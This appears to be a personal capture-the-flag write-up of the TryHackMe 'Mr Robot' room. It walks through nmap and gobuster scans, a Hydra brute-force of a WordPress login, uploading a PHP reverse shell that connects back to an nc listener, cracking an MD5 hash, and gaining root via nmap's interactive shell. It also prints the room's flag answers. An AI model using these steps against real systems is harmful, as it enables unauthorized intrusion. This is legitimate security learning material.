https://tryhackme.com/room/mrrobot

Machine IP: 10.10.184.106

Task 1 is a joke.


Task 2.1 What is key 1?
Hint: Robots
Nmap basic  scan: nmap -sV 10.10.184.106
Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-07 07:13 EST
Nmap scan report for 10.10.184.106
Host is up (0.18s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.86 seconds
Somethings to note is that security such as port 443 and 22 is here instead of just http or ftp being open. 
└─$ sudo nmap -sS -sV -A -T4 -vv 10.10.184.106
Results just in case something was missed. 443/tcp open   ssl/http syn-ack ttl 61 Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c163b1987c342ad6634c1c9d0aafb97
| SHA-1: ef0c5fa5931a09a5687ca2c280c4c79207cef71b

Apache server as earlier stated. 
Looking at the site loads what looks to be a script to run a linux login. Not prompted to a terminal login as root on fsociety. Gives me the option to run 6 or 7 commands. 
Running prepare: weird video. 
Running fsociety: shorter video. 
Running inform: more hints and such. 
Have promise with the join command…join returns a script sending of dialogue. Now asking for an email address. Plugged an email address test@gmail.com returned “see you soon”. 
Plugged in a ral email address to see if itr would send a hint or the next steps. 
Found in robots.txt User-agent: *
fsocity.dic
key-1-of-3.txt

Tried to curl the output of the first file, but unable to to do so. 
Found some commands trying curl -- http://10.10.184.106/robots.txt --output *   which downloads the file, but not the contents. 

Going back, viewing the page source of the web address returns. 
<!doctype html>
<!--
\   //~~\ |   |    /\  |~~\|~~  |\  | /~~\~~|~~    /\  |  /~~\ |\  ||~~
 \ /|    ||   |   /__\ |__/|--  | \ ||    | |     /__\ | |    || \ ||--
  |  \__/  \_/   /    \|  \|__  |  \| \__/  |    /    \|__\__/ |  \||__
-->
<html class="no-js" lang="">
  <head>
    <link rel="stylesheet" href="css/main-600a9791.css">

    <script src="js/vendor/vendor-48ca455c.js"></script>

    <script>var USER_IP='208.185.115.6';var BASE_URL='index.html';var RETURN_URL='index.html';var REDIRECT=false;window.log=function(){log.history=log.history||[];log.history.push(arguments);if(this.console){console.log(Array.prototype.slice.call(arguments));}};</script>

  </head>
  <body>
    <!--[if lt IE 9]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    

    <!-- Google Plus confirmation -->
    <div id="app"></div
    
    <script src="js/s_code.js"></script>
    <script src="js/main-acba06a5.js"></script>
</body>
</html>

In green is interesting
http://browsehappy.com/
visiting the site doesn’t really help either. 
I also see 208.185.115.6


Not any ip I recognize, site says it’s the User_IP. 
Returns a invalid ip. 
There is <script src="js/s_code.js"></script>
    <script src="js/main-acba06a5.js"></script>
Returns a whole lot of information to parse through. Just seems like scripts to run the website. Nothing stands out that is obvious. Also still no email. 
I was overthinking the curling the webpage, we can just type in the txt into the url lie so. http://10.10.184.106/key-1-of-3.txt

You get 073403c8a58a1f80d943455fb30724b9


2.2 What is key 2?
Visiting 10.10.184.106/User-agent: * returns nothing. 
Visiting http://10.10.184.106/fsocity.dic downloaded soemthing to my system. 
Returned a file called fsooity.dir.
Contains something I have never seen. Words are hidden until you hover or select them.
Seems like a basic wod list, maybe for bruteforcing ssh? List is rally long. 
So we have user-agent: *

Fsocity.dic: wordlist.
Funny how society is mispeled.  
Tried to connect to ssh beut connection refuses. 
Going back to the webpage source, searched key words that could help like “ssh”, “login” and “user” in the jscript.
Something to note is that I found a 
                    content: "-!- friend_ [friend_@" + USER_IP + "] has joined #fsociety.",

root@fsociety:
trying root@fsociety now..nothing new. 

I think its friend@10.10.184.106 in looking more into the jscript. 
Invalid email. 
friend_ [friend_@" + USER_IP + "] has joined #fsociety.",
this expriession I think is kept hidden or I am tripping. 
Friend_@ + 10.10.184.106, im stupid its my ip. 
Going to gobuster wat I amissing. Missing what the domain name is. 
Returned a decent amount of results. 
Something funny is that /atom crashedmy browser. 
Results
===============================================================
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.184.106/0/]
/admin                (Status: 301) [Size: 235] [--> http://10.10.184.106/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.184.106/feed/atom/]
/audio                (Status: 301) [Size: 235] [--> http://10.10.184.106/audio/]
/blog                 (Status: 301) [Size: 234] [--> http://10.10.184.106/blog/]
/css                  (Status: 301) [Size: 233] [--> http://10.10.184.106/css/]
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.184.106/wp-admin/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://10.10.184.106/feed/]
/Image                (Status: 301) [Size: 0] [--> http://10.10.184.106/Image/]
/image                (Status: 301) [Size: 0] [--> http://10.10.184.106/image/]
/images               (Status: 301) [Size: 236] [--> http://10.10.184.106/images/]
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.10.184.106/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 232] [--> http://10.10.184.106/js/]
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.10.184.106/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.184.106/]
/phpmyadmin           (Status: 403) [Size: 94]
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.184.106/feed/rdf/]
/readme               (Status: 200) [Size: 64]
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 301) [Size: 0] [--> http://10.10.184.106/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.184.106/feed/]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 235] [--> http://10.10.184.106/video/]
/wp-admin             (Status: 301) [Size: 238] [--> http://10.10.184.106/wp-admin/]
/wp-config            (Status: 200) [Size: 0]
/wp-content           (Status: 301) [Size: 240] [--> http://10.10.184.106/wp-content/]
/wp-cron              (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 241] [--> http://10.10.184.106/wp-includes/]
/wp-load              (Status: 200) [Size: 0]
/wp-links-opml        (Status: 200) [Size: 227]
/wp-login             (Status: 200) [Size: 2613]
/wp-settings          (Status: 500) [Size: 0]
/wp-mail              (Status: 500) [Size: 3064]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.184.106/wp-login.php?action=register]
/xmlrpc               (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 4612 / 4615 (99.93%)
Got a login @ http://10.10.184.106/wp-login.php.
Wordpress login which is out of the ordinary. 
Used Hydra to brute force the username with the commands /home/kali/thm/rooms/mrrobot/loot# hydra -L fsocity.dic -p test 10.10.12.13 
Found Elliot as the username 
Returned a ER28-0652, elliots employee number. 

Needed a guide for the rest of this, but how I can explain is that we need a reverse shell for reverses shell in wordpress.
Starting the nc listeners with └─$ nc -nlvp 4444
Work here: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
PHP file for the archives folder. Having issues opening and connecting to th lister.
Checked connection, port and ip. After redoing it I get. 
──(kali㉿kali)-[~]
└─$ nc -nlvp 4444         
listening on [any] 4444 ...
connect to [10.2.98.64] from (UNKNOWN) [10.10.184.106] 34489
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 13:22:33 up  1:10,  0 users,  load average: 0.05, 0.05, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
$
Tried to cap the 2nd text down below, but returned a permission denied. 
$ ls
key-2-of-3.txt
password.raw-md5
$ less key-2-of-3.txt
key-2-of-3.txt: Permission denied
need to escualte prvileage when we are just Linux in the whoami. 
I do see 
$ ls
key-2-of-3.txt
password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
$

Going to https://crackstation.net/ 
Its just abcdefghijklmnopqrstuvwxyz
I remember using python to upgrade priv with python -c 'import pty;pty.spawn("/bin/bash")
List of commands for show of work.
$ python -c 'import pty;pty.spawn("/bin/bash")'
daemon@linux:/$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:/$ whoami
whoami
robot
robot@linux:/$ ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
robot@linux:/$ cd /home/robot
cd /home/robot
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ less key-2-of-3.txt
less key-2-of-3.txt
WARNING: terminal is not fully functional
key-2-of-3.txt  (press RETURN)
822c73956184f694993bede3eb39f959
key-2-of-3.txt (END)


What is key 3?
Hint nmap
Strange hint, but I remember seeing info about hwo to escualte privlerage by setting up a shell that escualtes prvileages in a usr folder. Looking around manually in the usr/ folders I see 
/usr/bin/sudo & /usr/local/bin/nmap 
The latter may be a clue 
Sudo doesn’t really return anything, looking at gtfo bins we can see there is a shell for the nmap binary.
https://gtfobins.github.io/gtfobins/nmap/

Plugging in. 

aemon@linux:/$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap –interactive

•  The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
nmap --interactive
nmap> !sh


Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
#

Cool, looking around in the root folder returns 
ls
firstboot_done  key-3-of-3.txt
# less key-3-of-3.txt
less key-3-of-3.txt
WARNING: terminal is not fully functional
key-3-of-3.txt  (press RETURN)
04787ddef27c3dee1ee161b21670b4e4
key-3-of-3.txt (END)


Side notes, I guess the email was a pitfall thinking back on how much time I was wasted there. 